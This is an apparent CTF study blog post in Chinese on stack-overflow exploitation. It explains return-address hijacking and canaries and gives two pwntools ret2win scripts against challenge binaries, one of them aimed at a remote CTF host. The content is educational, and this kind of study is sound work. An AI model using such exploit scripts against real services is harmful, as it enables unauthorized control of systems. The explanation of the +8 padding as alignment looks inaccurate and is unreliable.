---
title: "PWN:栈溢出"
image: ''
pinned: false
comment: true
published: 2026-03-03
updated: 2026-04-16
description: "PWN"
category: PWN
tags: [PWN]
---

---

PWN题类:栈溢出



 原理：

修改EIP中的返回地址，从而控制整个程序的执行流，执行我们想要执行的操作，栈溢出通常发生在被调用函数的局部局部变量中。

何为EIP?	EIP是一个存放下一个执行函数地址的寄存器。

![image-20260304161807517](/images/image-20260304161807517.png)

这是nssctf上的一道简单的pwn 栈溢出的题型，通过ida的静态分析我们可以找到，程序从我们输入的var_20读取数据，一共可以在var_20中写入0x20字节的数据，接着写数据，就会溢出，到下面，_saved_registers，在往下写就到了 _return_address的内部，如果我们写入0x28的垃圾数据，占用缓冲区，然后在写入一个可执行的后门函数的地址，那么在运行程序时，程序就会因为垃圾数据流的占用，最后ret到我们的后门函数，从而劫持程序的执行流。

```
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
p = process("./pwn")

p.recvuntil(b"stack overflows")
backdoor = 0x401257 
payload = b'a' * 0x28 + p64(backdoor)
p.sendline(payload)
p.interactive()


```

这是题目的简单payload。



![image-20260304173306438](/images/image-20260304173306438.png)

```
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
p = remote("171.80.2.169",15774)


shell_addr = 0x400752 

payload = b'A' * (0x30 + 8) + p64(shell_addr)

p.recvuntil(b"say something?") 
p.sendline(payload)
p.interactive()
```

+8是为了符合16字节的对齐。



---

---

---



canary_pie绕过的栈溢出

何为canary保护：

canary是一种用来防止栈溢出的机制，其原理为，在一个函数的入口处，从寄存器 **(fs:32位，gs:64位)** 中读取一个4字节或者八字节的值到栈上，当函数结束时，会比较这个值在函数开始前和函数结束后是否一致，如果不一致就直接退出程序。

![image-20260304180154517](/images/image-20260304180154517.png)





---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
